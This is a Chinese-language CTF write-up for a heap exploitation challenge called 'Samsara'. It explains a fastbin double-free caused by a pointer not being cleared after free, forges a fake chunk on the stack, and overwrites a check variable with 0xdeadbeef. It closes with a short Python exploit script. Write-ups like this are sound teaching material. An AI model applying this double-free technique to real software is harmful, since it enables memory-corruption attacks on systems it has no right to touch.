# Samsara
又一道堆题，应该是最难的Pwn题。

逆向可以知道每次抓人都执行`malloc(8)`，我们不能控制分配的大小。那么在释放的时候，chunk必定进入fastbin。操作3就是编辑chunk的内容，不存在溢出。但是这题有两个奇怪的操作：输入4会打印出栈上变量`lair`的位置，输入5会改变`lair`的值。最后，退出程序时，检查栈上变量`target`是否等于`0xdeadbeef`，如果等于就能getflag，但是整个程序中不存在对`target`的任何读写操作。

漏洞点在于`free`之后没有置指针为NULL，考虑`double free`。首先分配三个chunk，按`chunk0->chunk1->chunk0`的顺序释放，第二次释放`chunk0`时它不在对应fastbin的头部，因此不会被检测到。再申请两次分别得到`chunk3`和`chunk4`，按first-fit原则前者即`chunk0`，后者即`chunk1`，但此时`chunk0`依然会留在fastbin中。

接下来，我们在`target`附近伪造chunk。我们逆向发现`lair`在`target`上方8B处，因此先输入4，设置`lair=0x20`以伪造`chunk_size`。然后输入5得到`&lair`，那么`&lair-8`处就是伪造的chunk的chunk指针。伪造好以后，我们向`chunk3`即`chunk0`的`fd`写入`&lair-8`。此时，fastbin内就变成了`chunk0->fake_chunk`，申请一次得到`chunk0`，第二次得到`fake_chunk`。

此时向`fake_chunk`写数据，等价于向`(&lair-8) + 0x10`也就是`target`写数据，写入`0xdeadbeef`并退出程序即可。
```py
def add():
	sla('> ','1')

def delete(index):
	sla('> ','2')
	sla(':\n',str(index))

def edit(index,content):
	sla('> ','3')
	sla(':\n',str(index))
	sla(':\n',content)

def show():
	sla('> ','4')
	ru('0x')
	return int(ru('\n'),16)

def move(dest):
	sla('> ','5')
	sla('?\n', str(dest))

add() # 0
add() # 1
add() # 2
delete(0)
delete(1)
delete(0)

add() # 3 <-> 0
add() # 4
move(0x20)
fake = show()-8
edit(3,fake)
add() # 5
add() # 6
edit(6,0xdeadbeef)
sla('> ','6')
```